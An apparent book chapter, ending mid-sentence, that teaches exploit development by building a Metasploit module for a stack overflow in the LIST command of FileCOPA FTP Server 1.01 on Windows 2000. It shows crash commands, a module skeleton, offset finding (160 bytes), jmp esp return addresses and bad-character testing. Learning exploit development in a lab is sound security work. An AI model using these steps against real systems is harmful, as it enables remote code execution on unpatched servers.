- en: Chapter 10. WRITING A METASPLOIT 3.1 MODULE WITH RUBY
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '![WRITING A METASPLOIT 3.1 MODULE WITH RUBY](../Images/00001.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The previous chapters of this book have been devoted to what I consider mainstream
    Ruby scripting. Ruby is one of my passions, and information security is another,
    so I decided to write a chapter combining them. This chapter is a step-by-step
    guide to exploit development using the Metasploit Framework (MSF).
  prefs: []
  type: TYPE_NORMAL
- en: For the following example, I used a vulnerability I found listed on the Open
    Source Vulnerability Database ([http://www.osvdb.org/](http://www.osvdb.org/)).
    We won't be discovering vulnerabilities ourselves, but there are many other books
    and articles written on the subject. If you like what you see here, then you should
    take a look at fuzzing and software reverse engineering because those are two
    of the primary methods used to find exploits.
  prefs: []
  type: TYPE_NORMAL
- en: By the end of this chapter, you will know how to write a working exploit for
    a closed-source FTP server—all using the wicked cool power of Ruby and MSF.
  prefs: []
  type: TYPE_NORMAL
- en: I almost couldn't believe it when I read that the Metasploit team decided to
    completely rewrite MSF in Ruby. (MSF 2.0 used Perl as its foundation.) A nice
    feature of both Perl and Ruby is that they are platform independent, so both Windows
    and Unix-like operating systems are capable of using the framework. I'm excited
    about this topic, so let's get started!
  prefs: []
  type: TYPE_NORMAL
- en: Introduction to Metasploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'MSF is a great tool for writing exploits, quickly switching payloads, and managing
    exploited systems. To make sure we are speaking the same language, the *exploit*
    is what allows the attacker to gain control of a system—the code that takes advantage
    of the software''s vulnerability. The *payload* is the code that you''d like to
    execute on the target machine after exploitation: It could be a bind shell, which
    would launch a command prompt every time an attacker connects to a specific port
    on the victim machine, or it could be as simple as adding a user on the victim
    machine. If you browse through an exploit-repository website like [http://www.milw0rm.com/](http://www.milw0rm.com/),
    you''ll find that most exploits have some payload at the top of the code. Those
    exploits only do one thing and are, thus, not terribly flexible. If you wanted
    a different payload, you would have to rewrite the exploit each time to add the
    new payload and make adjustments to the buffer sizes so the exploit continued
    to function properly. The process can be tedious.'
  prefs: []
  type: TYPE_NORMAL
- en: MSF creates the payloads dynamically, based on user input; once you write an
    exploit in MSF, switching payloads is a breeze. Along with the core of MSF, there
    are other tools and auxiliary modules that are useful during exploit development
    and penetration testing, such as reconnaissance, protocol fuzzing, Denial of Service,
    and vulnerability scanning. I encourage you to think beyond the exploits included
    with the framework. Many MSF users know the basics of MSF but don't know how to
    create their own modules. This chapter will expose you to the real strength of
    MSF—customized exploitation.
  prefs: []
  type: TYPE_NORMAL
- en: Installation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: I will be using two different systems for the example. One is a Windows XP machine
    (the attacker), and the other is a Windows 2000 machine (the victim). The physical
    network layout doesn't matter too much for this example. I used a virtualized
    network, but you can install the applications on one machine or have two separate
    computers. As far as operating systems, the victim must be a Windows 2000 machine
    due to the libraries used in the exploit. Once you have written the exploit, the
    attacking machine can run any operating system that is supported by Metasploit,
    which is just about everything. The choice is yours; the results will be the same.
  prefs: []
  type: TYPE_NORMAL
- en: To follow along with this chapter, you will need a fully functional installation
    of MSF 3.1 on your computer, which you can obtain from [http://www.metasploit.com/framework/](http://www.metasploit.com/framework/).
    Make sure you choose the Metasploit version for your operating system. I will
    be referring to a Windows installation, but the installation process on other
    operating systems will be similar due to the smart design of Metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: Once you've installed MSF on the attack machine, start the framework by selecting
    **Start ► Programs ► Metasploit 3 ► Metasploit 3 GUI**. (To follow along, non-Windows
    users should launch the Metasploit 3 GUI.)
  prefs: []
  type: TYPE_NORMAL
- en: 'MSF has four ways to operate the framework: *Metasploit 3 Web, Graphical User
    Interface (GUI), Command-Line Interface (CLI)*, and *Console*. The console and
    CLI are both text-based. The Metasploit 3 Web interface and GUI are graphical,
    with varying degrees of granularity in the exploit process. The GUI will be the
    interface we use for this chapter.'
  prefs: []
  type: TYPE_NORMAL
- en: I used the console almost exclusively in MSF 2.0, but I switched to the GUI
    in version 3.1 because the interface is so clean and easy to use, and the functionality
    is comparable to the console. Knowing how to operate the MSF console will provide
    a better understanding of the framework, and then switching between the console
    and GUI will become seamless.
  prefs: []
  type: TYPE_NORMAL
- en: At this point, you've installed MSF 3.1 and can start the Metasploit 3 GUI without
    errors. After you have started the framework, you should see an application window
    that pops up and loads MSF (see [Figure 10-1](#filepos783081)). If for some reason
    you don't get the pop-up, check the MSF logs for any errors.
  prefs: []
  type: TYPE_NORMAL
- en: '![The Metasploit GUI](../Images/00017.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 10-1. The Metasploit GUI
  prefs: []
  type: TYPE_NORMAL
- en: 'When the application has finished loading, you will notice several panes with
    different titles: *Exploits/Auxiliary, Jobs, Module Information/Output*, and *Sessions*.
    You can click around in each pane to see various parts of the framework. If you''ve
    gotten this far, then your MSF install was successful, and we can move on to writing
    the exploit. If this is your first time using MSF, then take a moment to browse
    around and get a feel for the interface before coming back to this section.'
  prefs: []
  type: TYPE_NORMAL
- en: Writing a Module
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The last time I checked, the framework came with over 450 exploits and 104 payloads
    to assist its users in security research. The number of payloads and exploits
    vary thanks to regular updates from the security community. The exploits included
    are based on well-known and documented vulnerabilities, so targeting a fully updated
    system would frustrate the user and framework … that is, unless the user knows
    how to write his own modules.^([[2](#filepos787314)])
  prefs: []
  type: TYPE_NORMAL
- en: The 450 exploits that come bundled with MSF 3.1 are located in *msf3.tar\msf3\modules\exploits\*.
  prefs: []
  type: TYPE_NORMAL
- en: The directory structure of the modules is very well organized; for example,
    to find an FTP exploit on a Windows machine, you'd look in the folder *windows*,
    and then *ftp*.
  prefs: []
  type: TYPE_NORMAL
- en: The target program we will be exploiting is FileCOPA FTP Server version 1.01
    from before July 18, 2006\. A Google search will turn up the vulnerable program.
    The FTP software runs on a Windows platform and provides an FTP service. The vulnerability
    we will exploit resides in improper bounds-checking of an argument passed to the
    `LIST` function. The vulnerability is publicly available, and the advisory, "FileCOPA
    FTP Server LIST Command Overflow," can be found on the Open Source Vulnerability
    Database website ([http://osvdb.org/show/osvdb/27389/](http://osvdb.org/show/osvdb/27389/)).
  prefs: []
  type: TYPE_NORMAL
- en: Several proof-of-concept exploits have been written for this vulnerability,
    so this exploit won't add anything new to the security world. However, by understanding
    how to create your own MSF module, you will be able to develop other undocumented
    exploits. This module was recently added to the MSF 3.1 installation. If you are
    using an older version of MSF (pre-3.1), then you can add the module to your MSF
    library.
  prefs: []
  type: TYPE_NORMAL
- en: '* * *'
  prefs: []
  type: TYPE_NORMAL
- en: ^([[2](#filepos785168)]) MSF euphemistically calls exploits *modules*. When
    you see *MSF module*, we're really talking about an exploit in MSF.
  prefs: []
  type: TYPE_NORMAL
- en: Building the Exploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As I mentioned previously, FileCOPA FTP Server has a vulnerability in its `LIST`
    function. By targeting a machine running the vulnerable application and sending
    a specially crafted `LIST` command to the server, we can execute arbitrary code
    on the remote machine. This is a good position to be in for a penetration tester
    or security researcher. To test this vulnerability, send the `LIST` command to
    the server followed by the letter A repeated 1,000 times (1,000 is arbitrary;
    the command just needs to be long enough to trigger the overflow). The result
    will be a dead FTP server. The repeated *A*s caused the server to crash because
    the *A*s overwrote important data on the stack.
  prefs: []
  type: TYPE_NORMAL
- en: To demonstrate the server crashing, we will use a tool bundled with MSF called
    netcat. The tool is located in **Start ► Programs ► Metasploit 3 ► Tools ► Netcat**,
    but it can also be downloaded as a standalone program. The basic description of
    netcat is that it's a networking utility used to read and write data across the
    network—perfect! We'll be reading and writing data to an FTP server across a network.
    To begin the FTP session, run the following commands (you can access the command
    prompt by selecting **Start ► Run**, typing **`cmd`**, and pressing ENTER.
  prefs: []
  type: TYPE_NORMAL
- en: '``**`nc -vv 127.0.0.1 21`** localhost [127.0.0.1] 21 (ftp) open USER anonymous
    220-InterVations FileCOPA FTP Server Version 1.01 220 Trial Version. 30 days remaining
    **`LIST -l ''A''x1000`**``'
  prefs: []
  type: TYPE_NORMAL
- en: The server crashed because it only expects input relating to the listing of
    a file or directory. To verify that the server crashed, try making another connection.
    When we send garbage data (e.g., `'A' x 1000`) to the FTP server, the victim application
    attempts to store all of the input and overwrites itself on the stack. This is
    known as a *stack-based buffer overflow*. The significance of this data overwriting
    is that the program overwrites an address used to point to the next instruction
    for execution. If we overwrite the next address for execution, we can point the
    program to execute our code.
  prefs: []
  type: TYPE_NORMAL
- en: 'There are several ways to send the big A string. One way is using netcat, as
    shown above. You can also use Perl, with something like `perl -e "print''A''x1000"`,
    or you can use Ruby. Any way you choose will have the same effect. Using Ruby,
    you can type something like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '``**`require ''net/ftp''`** **`Net::FTP.open(''127.0.0.1'') do |ftp|`** **`  
     ftp.login`** **`    ftp.list(''A'' + ''A''*1000)`** **`end`**``'
  prefs: []
  type: TYPE_NORMAL
- en: If you run the code snippet from netcat or Ruby a second time, you will get
    an error message because the client won't be able to connect to the crashed FTP
    server. That is the beginning of our attack. We still need more information to
    build a successful exploit, which leads us to the next step.
  prefs: []
  type: TYPE_NORMAL
- en: Watching in Real Time
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: To see the FTP server crash in real time and also track what's happening on
    the stack, you will need a *debugger*. I'm partial to OllyDbg ([http://www.ollydbg.de/](http://www.ollydbg.de/)),
    but Immunity, Inc. recently released Immunity Debugger ([http://www.immunitysec.com/products-immdbg.shtml/](http://www.immunitysec.com/products-immdbg.shtml/)),
    which I'm told is also good. Choose a debugger and install it on the computer
    hosting the FTP server.
  prefs: []
  type: TYPE_NORMAL
- en: Watching the program crash isn't complicated; the first step is to restart the
    FTP Server. Then fire up OllyDbg. When OllyDbg has opened, select **File ► Attach**.
    A list of running processes will pop up in a new window. The list will contain
    all of the processes currently running on the system hosting the FTP server (that
    is, the victim system). Scroll down the list of processes to find the FileCOPA
    FTP Server, named `filecpt`. This is the FTP server process, but it is not what
    we are looking for. If you make a connection to the FTP server, a new *child process*
    will spawn before the FTP server sends any packets. This is the process we want
    to attach. It's called `filecpnt`. Highlight the process and click the **Attach**
    button. Now OllyDbg will be monitoring the FTP connection and will notify you
    if the FileCOPA FTP program crashes or throws an error.
  prefs: []
  type: TYPE_NORMAL
- en: Moving back to your attack machine, you should already have a connection to
    the FTP server. All that's left to do is send the malicious `LIST` command as
    shown above, using netcat or Ruby. As soon as the `LIST` command is sent, OllyDbg
    should pop up on the victim computer with a bright yellow box in the bottom-right
    corner that states `paused`. The bottom-left corner should contain text that says
    `Access violation when executing [41414141]`. The `41` is the hexadecimal representation
    of the letter *A*—the same letter we smashed on the stack! That's exciting news;
    now we are getting somewhere. Take a look at the stack in OllyDbg, located in
    the lower-right pane of the program ([Figure 10-2](#filepos796638)). You'll see
    a whole bunch of `41414141`s repeated. This is the data we sent with the `LIST`
    command.
  prefs: []
  type: TYPE_NORMAL
- en: '![The OllyDbg report on the crashed FTP server](../Images/00018.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 10-2. The OllyDbg report on the crashed FTP server
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we can reliably crash the program by hand and we know where we are
    writing our information, let''s give this a try in MSF. To do this, we will need
    to create a shell module and use 1,000 *A*s as the payload. Remember that a module
    is the same thing as an exploit in MSF. The shell we will begin working with looks
    like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})       super(update_info(info,           ''Name''           => ''FileCOPA
    1.01 <= List Overflow'',           ''Description''    => %q{This module exploits
    a stack overflow in the FileCOPA multi-protocol file transfer service. A valid
    user account (or anonymous access) is required for this exploit to work.      
         },           ''Author''         => ''Steve <Steve@nostarch.com>'',       
       ''License''        => MSF_LICENSE,           ''Version''        => ''$Revision:
    4498 $'',           ''References''   =>             [             [''OSVDB'',
    ''27389''],           ],           ''Privileged''     => true,           ''DefaultOptions''
    =>             {             ''EXITFUNC'' => ''thread'',           },         
     ''Payload''        =>             {             ''Space''    => 1000,       
         ''BadChars'' => "\x00",           },           ''Targets''        =>     
           [             [               ''Windows 2000 Professional SP4 English'',
                  {                 ''Platform'' => ''win'',                 ''Ret''
         => 0XDEADBEEF,               },             ],           ]))     end    
     def exploit       connect_login        print_status("Trying target #{target.name}...")    
       print_status("Find the process and attach Ollydbg.")        sleep 30      
     buf  = ''A''*1000       send_cmd( [''LIST'', buf] , false)        handler   
       disconnect     end   end`'
  prefs: []
  type: TYPE_NORMAL
- en: Explanation of Metasploit Module Shell
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This shell has some common sections that are included in most MSF modules. The
    first is `require msf/core`. This `require` statement enables the module to use
    the MSF core library. Next is a class declaration. Since we are attacking an FTP
    server remotely, we need the module to inherit the attributes of `Msf::Exploit::Remote`.
    If you were developing a local privilege escalation or some other type of exploit,
    you would change this line to that specific exploit type. Another line specific
    to our FTP module is `Exploit::Remote::Ftp`, which enables the use of FTP methods.
    This line abstracts some of the commands, such as initializing a connection and
    logging in, so we can focus on writing the exploit rather than establishing the
    FTP session.
  prefs: []
  type: TYPE_NORMAL
- en: The `initialization` method is where the module begins to take shape. Stepping
    through each line, we begin with the name of the exploit and a description of
    the module. This can be whatever is relevant to the module you are writing. The
    descriptions will be shown whenever a user looks at the exploits from the framework.
    The more accurate the description, the less confusion later.
  prefs: []
  type: TYPE_NORMAL
- en: The next part of the `initialization` method contains information specific to
    the author of the module. Jumping to `payload, platform`, and `targets`—these
    options dictate how the exploit will function, what platforms to target, and other
    constraints. The `EXITFUNC` is set to `thread` so that only a process thread is
    killed when MSF disconnects from the victim. This method will attempt to keep
    from crashing the exploited program on a successful exploit and instead just crash
    a thread.
  prefs: []
  type: TYPE_NORMAL
- en: The payload space size needs to be set to something, and this number is critical
    to our exploit. Right now we will set the value to `1000` characters because we
    slammed A 1,000 times without issue, but we will modify this later. Next are the
    bad characters, or `BadChars`. This list will grow as we find characters that
    frustrate a successful exploit. I've already added `\x00` to the list because
    it signifies the end of a string and is a typical bad character.
  prefs: []
  type: TYPE_NORMAL
- en: The next section of the `initialization` method is for the `Targets`. I'm hosting
    the FTP server on a Microsoft Windows 2000 Professional Service Pack 4 machine,
    so the specific target information will be kept here. More platforms can be included
    as the exploit is tested on other operating systems, but for now, we will keep
    the targets limited to our one victim machine. This ends the initialization method
    and provides a solid starting point for the rest of the module.
  prefs: []
  type: TYPE_NORMAL
- en: The final method of our shell is the called `exploit,` and this is where the
    magic happens. Using `connect_login` (which is part of MSF), we start an FTP session
    with the target. See how much easier that was than using netcat or Ruby by itself?
  prefs: []
  type: TYPE_NORMAL
- en: A default status message is displayed after the connection, letting the user
    know that the exploit is in progress and the target information is held in `target.name`.
    Because we are targeting a child process, I added a `sleep` function (lasting
    30 seconds) to allow enough time to attach the debugger to the process before
    smashing the stack.
  prefs: []
  type: TYPE_NORMAL
- en: After the 30 seconds has expired, our payload is created and saved into `buf`.
    In this case, the payload will be 1,000 *A*s. The command `LIST` and the `buf`
    are both sent to the target, and the `handler` method is called to wait for a
    response from the target. If the exploit was successful, then `handler` will catch
    the response and control further actions. When the user is finished with the session,
    `disconnect` is called, which completes the exploit. In this example, the module
    will stop after the `send_cmd` because *A* (aka `\x41`) doesn't hack anything;
    so no response will be sent to `handler`.
  prefs: []
  type: TYPE_NORMAL
- en: To test your new MSF module, save this file as *filecopa_exploit.rb*^([[3](#filepos810139)])
    in the folder *\AppData\Local\.msf3\modules*\. Then start the FTP server, OllyDbg,
    and MSF. Attach OllyDbg to the FTP Server on the victim machine. On the attack
    machine, restart the MSF GUI. Within the MSF, click **Exploits**, and search for
    FileCOPA. Find the module shell we just wrote (it will have our description) and
    double-click it. A new window will pop up asking what platform you'd like to target.
    Since we only included one target in the module's code, we only have one choice.
    Click **Forward**. Next, you will select the `generic/shell_reverse_tcp` payload.
    Don't worry about the payload for now; we are only using A—not the actual payload.
    Click **Forward** to proceed. On the following screen, you will be asked to enter
    specific information about the target and yourself. The only information required
    is the `RHOST`, which will be the *remote host*, or victim's IP address. You can
    leave the fields that were already completed as they are unless you know that
    something is different than the default. MSF automatically detects your local
    IP address, assumes FTP is on port 21, and assumes the FTP server permits anonymous
    logins. Click the **Forward** button, review the information, and click **Apply**.
  prefs: []
  type: TYPE_NORMAL
- en: Remember, we have 30 seconds to attach the debugger to the correct process;
    so right after you hit **Apply**, you'll need to find the child process, `filecpnt`.
    After the process has been attached and MSF continues executing the module, OllyDbg
    should jump up on the victim machine and show the same messages it did before
    (when we manually exploited the FTP server).
  prefs: []
  type: TYPE_NORMAL
- en: '* * *'
  prefs: []
  type: TYPE_NORMAL
- en: ^([[3](#filepos807392)]) If you are using MSF 3.1, you will see *filecopa_list_overflow.rb*.
    This is the same exploit we are writing from scratch, so don't worry about it
    for now.
  prefs: []
  type: TYPE_NORMAL
- en: Finding the Payload Space
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: I mentioned that the payload space variable was critical to our exploit. The
    next step in development is to define the payload. To do this, we first need to
    find out how much space is available to play with. The more space we have, the
    more options we get as far as how much capability we can fit into our payloads.
    There are 104 payloads in MSF 3.1, and each payload is a different size. If the
    vulnerable program has limited space for us to use, then some of the larger payloads
    won't work. We also need to know what position on the stack is read as the next
    instruction right before it crashes.
  prefs: []
  type: TYPE_NORMAL
- en: During our first two exploit attempts, OllyDbg told us that the next instruction
    pointer's address was `0x41414141` when the FTP server crashed. This address is
    part of our *A* series. To identify which part was loaded into the instruction
    pointer, we need to change the *A* series to a series of characters that are unique
    and non-repeating. We will fill the code with predictable data and see where the
    program crashes. That will show where the address is being read from the stack.
    Basically, we will send the unique data, read where OllyDbg crashed, then search
    our string for the unique, non-repeating data. The final placement will show us
    the buffer size needed to gain control of the application.
  prefs: []
  type: TYPE_NORMAL
- en: 'MSF comes with a great tool called `pattern_create.rb`. You can find it in
    *msf3.tar\msf3\tool*. This Ruby script generates predictable, non-repeating strings—exactly
    what we will use to find the payload space. Because we have used 1,000 as the
    number of characters in our payload, we will use *pattern_create.rb* to generate
    a unique 1,000-character string. The following command will generate the pattern
    and output the results to *payload_test.txt*:'
  prefs: []
  type: TYPE_NORMAL
- en: '``C:\Users\Steve\AppData\Local\msf3\tools>**`ruby pattern_create.rb 1000 >
    payload_test.txt`**``'
  prefs: []
  type: TYPE_NORMAL
- en: 'The contents of *payload_test.txt* are shown below:'
  prefs: []
  type: TYPE_NORMAL
- en: '`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
    Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
    Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7
    Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3
    Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9
    An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5
    Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1
    As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7
    Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3
    Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9
    Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5
    Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1
    Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh`'
  prefs: []
  type: TYPE_NORMAL
- en: 'We now open the *filecopa_exploit.rb* module and add the string located in
    *payload_test.txt* in place of the `''A''*1000`. The new line will look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '`buf = ''Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac
    5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af
    1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah
    7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak
    3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am
    9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap
    5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As
    1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au
    7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax
    3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az
    9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc
    5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf
    1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh''`'
  prefs: []
  type: TYPE_NORMAL
- en: Save the updated *filecopa_exploit.rb* and return to the MSF window. To reload
    the edited module, click **System ► Refresh** in the GUI. Reset the applications
    by starting the FTP server and attaching OllyDbg. Run the module as described
    above, and you should see a different error message in OllyDbg. Instead of an
    access violation at `[41414141]`, there will now be an access violation at `[66413366]`
    (see [Figure 10-3](#filepos817346)).
  prefs: []
  type: TYPE_NORMAL
- en: '![OllyDbg attached to FileCOPA showing an access violation](../Images/00019.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 10-3. OllyDbg attached to FileCOPA showing an access violation
  prefs: []
  type: TYPE_NORMAL
- en: We are making great progress! I hope you're beginning to see how easy MSF makes
    it to develop exploits. Take this new address and prepare to use another great
    MSF tool called *pattern_offset.rb*.
  prefs: []
  type: TYPE_NORMAL
- en: 'As you may have guessed, this script will be able to tell us exactly how much
    space is used before the vulnerable stack space is called. Type the following
    command, passing the crashed address (`66413366`) and the length of the *payload_test.txt*
    string (`1000`):'
  prefs: []
  type: TYPE_NORMAL
- en: '``C:\Program Files\Metasploit\Framework3\framework\tools>**`ruby pattern_offset.rb
    66413366  1000`**``'
  prefs: []
  type: TYPE_NORMAL
- en: The script responds with how much space needs to be filled before we write an
    address to jump to. In this example, the size of the offset was 160 bytes.
  prefs: []
  type: TYPE_NORMAL
- en: '``C:\Program Files\Metasploit\Framework3\framework\tools>**`ruby pattern_offset.rb
    66413366 1000`** 160``'
  prefs: []
  type: TYPE_NORMAL
- en: We need to provide an address to return or jump to so that we can execute our
    own code. Since `0x41414141` and `0x66413366` won't do anything for our exploit,
    we need to get a different address. I use the online MSF Operation Code (*opcode*)
    database to get an address that allows us to execute our code. This website allows
    the user to search for a specific opcode for any operating system. For this example,
    I went to [http://www.metasploit.com/users/opcode/msfopcode.cgi/](http://www.metasploit.com/users/opcode/msfopcode.cgi/)
    (see [Figure 10-4](#filepos820404)).
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit Online Opcode Database](../Images/00020.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 10-4. Metasploit Online Opcode Database
  prefs: []
  type: TYPE_NORMAL
- en: I then clicked **Search for opcodes in a set of modules**.
  prefs: []
  type: TYPE_NORMAL
- en: I selected the **Specific Opcode** radio button and chose **jmp esp** from the
    drop-down menu.
  prefs: []
  type: TYPE_NORMAL
- en: A list of *.dll*s are shown, and the important thing to remember when choosing
    a *.dll* is that you want it to be as generic, or common across as many platforms,
    as possible. The *uer32.dll* file is pretty generic, so that influenced my decision.
  prefs: []
  type: TYPE_NORMAL
- en: I selected my target machine (Windows 2000 Service Pack 4 - English) and clicked
    **Next**.
  prefs: []
  type: TYPE_NORMAL
- en: The opcode database returned two addresses (`0x77e14c29` and `0x77e3c256`) that
    matched my criteria.
  prefs: []
  type: TYPE_NORMAL
- en: The exploit is almost complete, but we still need to craft the `LIST` command
    and remove all of the bad characters that will frustrate the exploit. Failure
    to remove the bad characters from our payload will result in a failed exploit
    because our payload will be altered by the application.
  prefs: []
  type: TYPE_NORMAL
- en: 'To find the bad characters, we need to send all of the hexadecimal characters
    in the ASCII table and determine which ones are modified and corrupted during
    transmission. We modify the payload to contain `int3` (hex value `0xcc`) plus
    `0-255` repeated twice. The repetition of 0 through 255 narrows down what modified
    our character—was it a filter in the application trying to keep bad data out of
    the input buffer, or was it a method that used data as execution commands? Either
    way, we want our data to arrive untouched in the victim application''s input buffer.
    If the character was modified in only one place, then presumably, a method altered
    our data. If two of the same characters are altered, then a filter probably intervened.
    The character string is easily generated using this command (the C argument specifies
    that the `pack` method uses unsigned chars):'
  prefs: []
  type: TYPE_NORMAL
- en: '`buf  = "\xcc" + ([*(1..255)].pack (''C*'') *2)`'
  prefs: []
  type: TYPE_NORMAL
- en: The following assignment to `buf` would have accomplished the same as the line
    above, but you can see how much smaller the line above is. I prefer the concise
    declarations.
  prefs: []
  type: TYPE_NORMAL
- en: '`buf = ''\xcc\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\
    x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\ x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\
    x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\ x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\
    x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\ x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\
    x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\ x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\
    xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\ xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\
    xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\ xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\
    xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff...''`'
  prefs: []
  type: TYPE_NORMAL
- en: When viewing the crashed FTP server in OllyDbg, we look for the input supplied
